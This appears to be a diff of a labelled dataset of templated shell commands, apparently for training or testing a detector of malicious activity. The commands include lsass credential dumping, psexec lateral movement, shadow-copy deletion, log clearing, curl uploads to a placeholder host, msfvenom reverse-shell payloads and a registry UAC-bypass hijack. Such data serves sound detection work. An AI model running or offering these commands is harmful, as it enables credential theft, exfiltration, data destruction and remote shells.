@@ -1,128 +1,128 @@
-1	choco install -y 7zip
-1	cmd /c "choco install -y 7zip"
-1	powershell -c "choco install -y 7zip"
-1	choco install 7zip
-1	cmd /c "choco install 7zip"
-1	powershell -c "choco install 7zip"
-1	choco install -f 7zip
-1	cmd /c "choco install -f 7zip"
-1	powershell -c "choco install -f 7zip"
-1	choco install -y putty
-1	cmd /c "choco install -y putty"
-1	powershell -c "choco install -y putty"
-1	choco install putty
-1	cmd /c "choco install putty"
-1	powershell -c "choco install putty"
-1	choco install -f putty
-1	cmd /c "choco install -f putty"
-1	powershell -c "choco install -f putty"
-1	choco install rclone
-1	cmd /c "choco install rclone"
-1	powershell -c "choco install rclone"
-1	choco install -y rclone
-1	cmd /c "choco install -y rclone"
-1	powershell -c "choco install -y rclone"
-1	choco install -f rclone
-1	cmd /c "choco install -f rclone"
-1	powershell -c "choco install -f rclone"
-1	choco install ngrok
-1	cmd /c "choco install ngrok"
-1	powershell -c "choco install ngrok"
-1	choco install -y ngrok
-1	cmd /c "choco install -y ngrok"
-1	powershell -c "choco install -y ngrok"
-1	choco install -f ngrok
-1	cmd /c "choco install -f ngrok"
-1	powershell -c "choco install -f ngrok"
-1	choco install psexec
-1	cmd /c "choco install psexec"
-1	powershell -c "choco install psexec"
-1	choco install -y psexec
-1	cmd /c "choco install -y psexec"
-1	powershell -c "choco install -y psexec"
-1	choco install -f psexec
-1	cmd /c "choco install -f psexec"
-1	powershell -c "choco install -f psexec"
-1	choco install procdump
-1	cmd /c "choco install procdump"
-1	powershell -c "choco install procdump"
-1	choco install -y procdump
-1	cmd /c "choco install -y procdump"
-1	powershell -c "choco install -y procdump"
-1	choco install -f procdump
-1	cmd /c "choco install -f procdump"
-1	powershell -c "choco install -f procdump"
-1	choco install Megasync
-1	cmd /c "choco install Megasync"
-1	powershell -c "choco install Megasync"
-1	choco install -y Megasync
-1	cmd /c "choco install -y Megasync"
-1	powershell -c "choco install -y Megasync"
-1	choco install -f Megasync
-1	cmd /c "choco install -f Megasync"
-1	powershell -c "choco install -f Megasync"
-1	choco install winscp
-0	cmd /c "Psexec64 \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}"
-0	cmd /c "procdump -mm lsass.exe lsassdump.dmp"
-0	powershell -c "curl.exe -X POST -H -F file=@${source_file_path} http://${ip_address}:${port}/upload"
-0	ipconfig /all
+1	mail -s ${email_subject} ${username}@${domain} < mail.txt
+1	mail -s ${email_subject} ${username}@${domain} < mail.txt 2> /dev/null
+1	mail -s ${email_subject} ${username}@${domain} < mail.txt 2> &1
+1	mail -s ${email_subject} ${username}@${domain} < mail.txt 2> error.log
+1	echo ${email_content} | mail -s ${email_subject} ${username}@${domain}
+1	echo ${email_content} | mail -s ${email_subject} ${username}@${domain} 2> /dev/null
+1	echo ${email_content} | mail -s ${email_subject} ${username}@${domain} 2> &1
+1	echo ${email_content} | mail -s ${email_subject} ${username}@${domain} 2> error.log
+1	cat email.txt | mail -s ${email_subject} ${username}@${domain}
+1	cat email.txt | mail -s ${email_subject} ${username}@${domain} 2> /dev/null
+1	cat email.txt | mail -s ${email_subject} ${username}@${domain} 2> &1
+1	cat email.txt | mail -s ${email_subject} ${username}@${domain} 2> error.log
+1	echo ${email_content} | mutt -s ${email_subject} ${username}@${domain}
+1	echo ${email_content} | mutt -s ${email_subject} ${username}@${domain} 2> /dev/null
+1	echo ${email_content} | mutt -s ${email_subject} ${username}@${domain} 2> &1
+1	echo ${email_content} | mutt -s ${email_subject} ${username}@${domain} 2> error.log
+1	echo ${email_content} | mutt -s ${email_subject} ${username}@${domain} -a attachement.txt
+1	echo ${email_content} | mutt -s ${email_subject} ${username}@${domain} -a attachement.txt 2> /dev/null
+1	echo ${email_content} | mutt -s ${email_subject} ${username}@${domain} -a attachement.txt 2> &1
+1	echo ${email_content} | mutt -s ${email_subject} ${username}@${domain} -a attachement.txt 2> error.log
+1	cat email.txt | mutt -s ${email_subject} ${username}@${domain}
+1	cat email.txt | mutt -s ${email_subject} ${username}@${domain} 2> /dev/null
+1	cat email.txt | mutt -s ${email_subject} ${username}@${domain} 2> &1
+1	cat email.txt | mutt -s ${email_subject} ${username}@${domain} 2> error.log
+1	echo ${email_content} | mpack -s ${email_subject} ${username}@${domain}
+1	echo ${email_content} | mpack -s ${email_subject} ${username}@${domain} 2> /dev/null
+1	echo ${email_content} | mpack -s ${email_subject} ${username}@${domain} 2> &1
+1	echo ${email_content} | mpack -s ${email_subject} ${username}@${domain} 2> error.log
+1	echo ${email_content} | mpack -s ${email_subject} ${username}@${domain} -a attachement.txt
+1	echo ${email_content} | mpack -s ${email_subject} ${username}@${domain} -a attachement.txt 2> /dev/null
+1	echo ${email_content} | mpack -s ${email_subject} ${username}@${domain} -a attachement.txt 2> &1
+1	echo ${email_content} | mpack -s ${email_subject} ${username}@${domain} -a attachement.txt 2> error.log
+1	cat email.txt | mpack -s ${email_subject} ${username}@${domain}
+1	cat email.txt | mpack -s ${email_subject} ${username}@${domain} 2> /dev/null
+1	cat email.txt | mpack -s ${email_subject} ${username}@${domain} 2> &1
+1	cat email.txt | mpack -s ${email_subject} ${username}@${domain} 2> error.log
+1	sendmail ${username}@${domain} < mail.txt
+1	sendmail ${username}@${domain} < mail.txt 2> /dev/null
+1	sendmail ${username}@${domain} < mail.txt 2> &1
+1	sendmail ${username}@${domain} < mail.txt 2> error.log
+1	echo ${email_content} | sendmail ${username}@${domain}
+1	echo ${email_content} | sendmail ${username}@${domain} 2> /dev/null
+1	echo ${email_content} | sendmail ${username}@${domain} 2> &1
+1	echo ${email_content} | sendmail ${username}@${domain} 2> error.log
+1	cat email.txt | sendmail ${username}@${domain}
+1	cat email.txt | sendmail ${username}@${domain} 2> /dev/null
+1	cat email.txt | sendmail ${username}@${domain} 2> &1
+1	cat email.txt | sendmail ${username}@${domain} 2> error.log
+1	ssmtp ${username}@${domain} < mail.txt
+1	ssmtp ${username}@${domain} < mail.txt 2> /dev/null
+1	ssmtp ${username}@${domain} < mail.txt 2> &1
+1	ssmtp ${username}@${domain} < mail.txt 2> error.log
+1	echo -e ${email_content} | ssmtp ${username}@${domain}
+1	echo -e ${email_content} | ssmtp ${username}@${domain} 2> /dev/null
+1	echo -e ${email_content} | ssmtp ${username}@${domain} 2> &1
+1	echo -e ${email_content} | ssmtp ${username}@${domain} 2> error.log
+1	cat email.txt | ssmtp ${username}@${domain}
+1	cat email.txt | ssmtp ${username}@${domain} 2> /dev/null
+1	cat email.txt | ssmtp ${username}@${domain} 2> &1
+1	cat email.txt | ssmtp ${username}@${domain} 2> error.log
+1	mailx -s ${email_subject} ${username}@${domain} < mail.txt
+1	mailx -s ${email_subject} ${username}@${domain} < mail.txt 2> /dev/null
+1	mailx -s ${email_subject} ${username}@${domain} < mail.txt 2> &1
+1	mailx -s ${email_subject} ${username}@${domain} < mail.txt 2> error.log
+0	plink.exe -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
+0	curl -v -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload
+0	nmap -p- -sV -O ${ip_address}
+0	wevtutil.exe clear-log application
+0	nmap -sP ${ip_address} 2> &1
+0	cmd /c "mstsc /v:${ip_address}"
+0	cmd /c "procdump.exe -mm lsass.exe lsassdump.dmp"
+0	powershell -c "mstsc.exe /v:${ip_address} /f /restrictedAdmin"
+0	mstsc /v:${ip_address}
+0	nmap -v -A ${ip_address} 2> &1
+0	powershell -c "mstsc.exe /v:${ip_address} /f /restrictedAdmin"
+0	choco install Megasync
+0	wevtutil cl application
+0	cmd /c "7z a ${destination_file_path} ${source_file_path} -p${password}"
+0	cmd /c "vssadmin delete shadows /All /quiet"
+0	psexec \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d
+0	cmd /c "curl.exe -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload"
+0	netstat -r
+0	cmd /c "procdump -accepteula -ma lsass.exe lsassdump.dmp"
+0	powershell -c "choco install procdump"
+0	nmap -sV ${ip_address} 2> /dev/null
+0	cmd /c "taskkill.exe /f /IM ${process_name} /T"
+0	powershell -c "vssadmin Delete Shadows /All"
+0	cmd /c "7z a -slp -p${password} ${destination_file_path} ${source_file_path}"
+0	cmd /c "7z.exe a -p${password} ${destination_file_path} ${source_file_path}"
+0	cmd /c "taskkill.exe /f /IM ${process_name}"
+0	procdump -mm lsass.exe lsassdump.dmp
+0	Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d
+0	powershell -c "procdump.exe -ma lsass.exe lsassdump.dmp"
+0	powershell -c "psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d"
+0	sdelete -f -q ${local_file_path}
+0	powershell -c "Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d"
+0	vssadmin.exe Delete Shadows /all /Quiet
+0	cmd /c "certutil -encode ${source_file_path} ${destination_file_path}"
+0	powershell -c "vssadmin.exe delete shadows /All /Quiet"
+0	choco install -y procdump
+0	cmd /c "vssadmin.exe delete shadows /All /quiet"
+0	certutil -encode -UnicodeText -f error.txt encode.txt
+0	powershell -c "7z a -slp ${destination_file_path} ${source_file_path} -p"
+0	cmd /c "certutil -encode -Unicode error.txt encode.txt"
+0	cmd /c "arp.exe -g"
+0	cmd /c "vssadmin delete shadows /All /quiet"
+0	plink.exe -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}
+0	powershell -c "psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d"
+0	powershell -c "netstat -a"
+0	psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d
+0	mstsc /v:${ip_address} /f /admin
+0	mstsc /v:${ip_address} /f /admin
+0	cmd /c "ipconfig.exe /renew"
+0	cmd /c "wmic.exe os get Caption,Version"
+0	powershell -c "msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+0	certutil -encode -Unicode error.txt encode.txt
+0	mstsc.exe /v:${ip_address} /f /restrictedAdmin
+0	powershell -c "vssadmin.exe Delete Shadows /all /quiet"
+0	msfvenom -p windows/x64/meterpreter/reverse_winhttp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+0	cmd /c "msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+0	7z a -slt ${destination_file_path} ${source_file_path} -p${password}
+0	cmd /c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s"
+0	cmd /c "wmic.exe os get Version"
 0	cmd /c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d"
-0	powershell -c "sdelete -s -accepteula ${local_file_path}"
-0	powershell -c "wmic os get CSName"
-0	arp.exe -a
-0	certutil -encode -UnicodeText -v error.txt encode.txt
-0	powershell -c "wmic.exe os get Caption"
-0	procdump -mm lsass lsassdump.dmp
-0	cmd /c "curl.exe -X POST http://${ip_address}/upload -H -F files=@${source_file_path}"
-0	mstsc /v:${ip_address} /remoteGuard
-0	nmap -sV ${ip_address} 2> &1
-0	Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s
-0	powershell -c "vssadmin.exe delete shadows /all /Quiet"
-0	cmd /c "wmic.exe shadowcopy call create Volume=C:"
-0	cmd /c "tasklist.exe"
-0	nmap -p- -sC -sV -O ${ip_address} 2> /dev/null
-0	ssmtp ${username}@${domain} < mail.txt 2> error.log
-0	nmap -A ${ip_address} 2> /dev/null
-0	powershell -c "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-0	nmap ${ip_address}
-0	rm -f ${local_file_path}
-0	sdelete -s -accepteula ${local_file_path}
-0	certutil -encode -Unicode -v error.txt encode.txt
-0	vssadmin.exe Delete Shadows /All
-0	powershell -c "mstsc /v:${ip_address} /f"
-0	cat email.txt | mailx -s ${email_subject} ${username}@${domain} 2> error.log
-0	nmap -A ${ip_address} 2> /dev/null
-0	cmd /c "procdump -mm lsass lsassdump.dmp"
-0	cat email.txt | mailx -s ${email_subject} ${username}@${domain}
-0	cmd /c "certutil -encode -UnicodeText -gmt error.txt encode.txt"
-0	powershell -c "msfvenom -p windows/meterpreter/reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-0	powershell -c "netstat.exe"
-0	wmic.exe os get Caption
-0	wmic os get TotalVirtualMemorySize
-0	rm -fr ${local_file_path} 2> error.log
-0	powershell -c "msfvenom -p windows/meterpreter_reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-0	rm -r ${local_file_path} 2> &1
-0	powershell -c "wmic os get CSName"
-0	curl -X POST -F "file=@${source_file_path}" http://${ip_address}:${port}/upload
-0	rm -rf ${local_file_path}
-0	del /f ${local_file_path}
-0	powershell -c "arp.exe -g"
-0	cmd /c "procdump -mm lsass lsassdump.dmp"
-0	nmap ${ip_address} 2> &1
-0	cmd /c "wmic.exe os get FreePhysicalMemory"
-0	powershell -c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d -s"
-0	powershell -c "Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d -s"
-0	powershell -c "certutil -encode -Unicode -gmt error.txt encode.txt"
-0	powershell -c "Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}"
-0	powershell -c "vssadmin delete shadows /All"
-0	cmd /c "curl.exe -X POST -H -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload"
-0	7z.exe a -slt -p ${destination_file_path} ${source_file_path}
-0	msfvenom -p windows/x64/shell_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-0	mstsc.exe /v:${ip_address} /remoteGuard
-0	sendmail ${username}@${domain} < mail.txt 2> &1
-0	cmd /c "vssadmin create shadow /for=C:"
-0	netstat -f
-0	powershell -c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s"
-0	systeminfo
-0	cmd /c "wmic.exe os get CSName"
-0	7z.exe a -slt -p ${destination_file_path} ${source_file_path}
+0	powershell -c "procdump -accepteula -ma lsass lsassdump.dmp"
+0	msfvenom -p windows/meterpreter/reverse_winhttp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+0	cmd /c "certutil -encode -UnicodeText -f error.txt encode.txt"
+0	cmd /c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ /f"
